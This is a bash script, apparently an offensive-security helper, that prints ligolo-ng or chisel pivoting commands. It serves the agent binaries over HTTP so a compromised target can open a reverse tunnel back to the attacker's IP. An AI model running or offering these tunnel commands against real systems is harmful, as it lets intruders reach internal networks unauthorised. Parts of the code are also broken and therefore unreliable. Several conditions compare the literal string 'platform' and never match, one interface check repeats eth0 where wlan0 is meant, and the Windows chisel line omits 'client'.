#!/bin/bash

RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
BLUE=$(tput setaf 4)
NC=$(tput sgr0)
bold=$(tput bold)
ul=$(tput smul)

platform=$1
method=$2
if [ "$platform" = "-h" ]; then
    printf "${RED}Usage: ${NC}proxify platform method\n"
    printf "\n        platform - w for windows or l for linux\n"
    printf "\n        method - c for chisel or l for ligolo"
    exit
fi

if [ -n "$(ifconfig tun0)" ]; then
    ip=$(ifconfig tun0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
elif [ -n "$(ifconfig eth0)" ]; then
    ip=$(ifconfig eth0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
elif [ -n "$(ifconfig eth0)" ]; then
    ip=$(ifconfig wlan0 | grep -E 'inet (addr:)?([0-9]+\.){3}[0-9]+' | awk '{print $2}' | cut -d ':' -f2)
else
    echo "${RED}Error: Unable to retrieve IP address.${NC}"
    echo "Enter IP address:"
    read -r ip
fi

if [ "$method" = "l" ]; then
	printf "\n${RED}======================================Ligolo======================================${NC}\n"
	printf "\n${YELLOW}${ul}${bold}Kali:${NC}"
	printf "\nsudo ip tuntap add user kali mode tun ligolo"
	printf "\nsudo ip link set ligolo up"
	printf "\nsudo ligolo-proxy -selfcert"
	printf "\nsudo ip route add ip dev ligolo\n${NC}"
	printf "\n${YELLOW}${ul}${bold}Target:\n${NC}"
	if [[ "$platform" = "l" ]]; then
		printf "./agent -connect $ip:11601 -ignore-cert -retry"
	else
		printf ".\\\agent.exe -connect $ip:11601 -ignore-cert -retry"
	fi
	if ss -tuln | grep ':80 ' >/dev/null 2>&1; then
        printf "\nPort 80 is in use, using port 8080 instead.\n"
        if [ "platform" = "l" ]; then
        	Transfile.sh agent l 8080
        else
        	Transfile.sh agent.exe w
        fi
        python3 -m http.server 8080 -d /home/kali/Documents/Common/ligolo/

    else
        if [ "platform" = "l" ]; then
        	Transfile.sh agent l
        else
        	Transfile.sh agent.exe w
        fi
        python3 -m http.server 80 -d /home/kali/Documents/Common/ligolo/
    fi 
fi
if [ "$method" = "c" ]; then
	printf "\n${RED}======================================Chisel======================================${NC}\n"
	printf "\n${YELLOW}${ul}${bold}Kali:${NC}"
	printf "\nchisel server --reverse --socks5 -p 8001"
	printf "\n${YELLOW}${ul}${bold}Target:\n${NC}"
	if [[ "$platform" = "l" ]]; then
		printf "./chisel client $ip:8001 R:socks"
	else
		printf ".\\\chisel.exe $ip:8001 R:socks"
	fi
	if ss -tuln | grep ':80 ' >/dev/null 2>&1; then
        printf "\nPort 80 is in use, using port 8080 instead.\n"
        if [ "platform" = "l" ]; then
        	Transfile.sh chisel l 8080
        else
        	Transfile.sh chisel.exe w 8080
        fi
        python3 -m http.server 8080 -d /home/kali/Documents/Common/chisel/

    else
        if [ "platform" = "l" ]; then
        	Transfile.sh chisel l
        else
        	Transfile.sh chisel.exe w
        fi
        python3 -m http.server 80 -d /home/kali/Documents/Common/chisel/
    fi
fi

